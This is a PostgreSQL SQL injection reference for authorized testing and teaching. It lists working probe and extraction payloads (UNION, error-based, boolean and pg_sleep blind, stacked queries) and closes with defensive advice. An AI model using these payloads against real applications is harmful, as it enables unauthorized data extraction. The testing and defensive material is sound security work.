# PostgreSQL — Example SQL Injection Payloads & Notes (Non‑destructive, Educational)

> [!WARNING]
> **Ethics reminder:** The examples in this file are for education and authorized testing only. Do **not** run these payloads against systems you do not own or do not have explicit written permission to test. Use intentionally vulnerable labs or local PostgreSQL instances for practice.

---

## Contents

* Basic detection probes
* UNION-based examples (non-destructive)
* Error-based examples (safe probes)
* Boolean-based blind examples
* Time-based blind examples (`pg_sleep`)
* Stacked-queries and statement behavior in PostgreSQL
* PostgreSQL-specific functions & system catalogs
* Defensive notes specific to PostgreSQL

---

## 1. Basic detection probes

Start with simple probes to see if input affects SQL:

* `'` — single quote to provoke syntax errors.
* `"` — double quote depending on context.
* `1 OR 1=1` — logical manipulation probe.

Example HTTP parameter probe:

```
GET /product?id=1'
```

Look for Postgres errors like `ERROR: syntax error at or near` or `column "..." does not exist`.

---

## 2. UNION-based (non-destructive) examples

Assume an original query: `SELECT id, name, price FROM products WHERE id = 'USER_INPUT'`

### Find column count

Incremental `NULL` approach:

```sql
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```

Stop when no column-count error appears.

### Identify display columns

```sql
' UNION SELECT 'C1', 'C2', 'C3' --
```

Observe which markers appear in the page to find reflected columns.

### Non-destructive enumeration examples

After identifying display columns:

```sql
' UNION SELECT NULL, version(), NULL --
' UNION SELECT NULL, current_user, NULL --
' UNION SELECT NULL, current_database(), NULL --
```

These reveal Postgres version, current user, and current database for fingerprinting (lab-only).

---

## 3. Error-based (safe probes)

Trigger syntax or type errors to fingerprint and inspect behavior.

* Single quote: `'`
* Type conversion error example (illustrative):

```sql
' AND 1=(SELECT CAST(current_database() AS INTEGER)) --
```

This may produce an error like `invalid input syntax for integer` revealing context.

Avoid aggressive error-inducing payloads on production systems.

---

## 4. Boolean-based blind examples

Character extraction pattern (Postgres):

```sql
' AND SUBSTRING((SELECT current_user),1,1) = 'p' --
```

Confirm injection with `AND 1=1` / `AND 1=2` before attempting extraction.

Optimizations:

* Narrow character set to speed extraction.
* Use binary search over ASCII ranges where supported.

---

## 5. Time-based blind examples (`pg_sleep`)

Postgres timing function: `pg_sleep(seconds)`

### Simple timing check

```sql
' OR CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

If response time increases by \~5s, the server executed the sleep.

### Character extraction using pg\_sleep

```sql
' OR CASE WHEN SUBSTRING((SELECT current_database()),1,1) = 'p' THEN pg_sleep(5) ELSE pg_sleep(0) END --
```

Repeat tests and average timings to reduce false positives from network variability.

---

## 6. Stacked-queries and statement behavior in PostgreSQL

Postgres supports multiple SQL statements per query string in many contexts, but client libraries may restrict this behavior.

### Safe test for multi-statement support

```sql
' ; SELECT 'X' --
```

If the server executes additional statements, batching is supported — treat this as high risk.

**Warning:** Avoid destructive payloads during discovery.

---

## 7. PostgreSQL-specific functions & system catalogs

* `version()` — Postgres version
* `current_user`, `session_user` — current user names
* `current_database()` — current DB name
* `pg_sleep(seconds)` — timing-based delays
* `pg_read_file` / `pg_ls_dir` — file access (superuser-only)
* `information_schema.tables`, `information_schema.columns`, and `pg_catalog` — metadata repositories (requires read access)
* `string_agg`, `array_to_string`, `encode`/`decode` — useful for constructing payloads

**Note:** Many powerful functions require elevated privileges and are disabled for normal application accounts.

---

## 8. Defensive notes specific to PostgreSQL

> [!NOTE]
> * Use parameterized queries (e.g., `$1` placeholders) to eliminate injection risk.
> * Run the database under minimal-privilege roles; restrict access to powerful functions (`pg_read_file`, etc.).
> * Disable or limit untrusted procedural languages and features when not required.
> * Hide detailed DB errors from end users and log them internally.
> * Monitor for unusual queries against `pg_catalog` or long-running `pg_sleep` invocations.

---

## 9. Where to practice safely

> [!TIP]
> * PortSwigger Academy labs with Postgres targets
> * Local Docker containers running Postgres + intentionally vulnerable web apps
> * OWASP Juice Shop configured against Postgres backends (if available)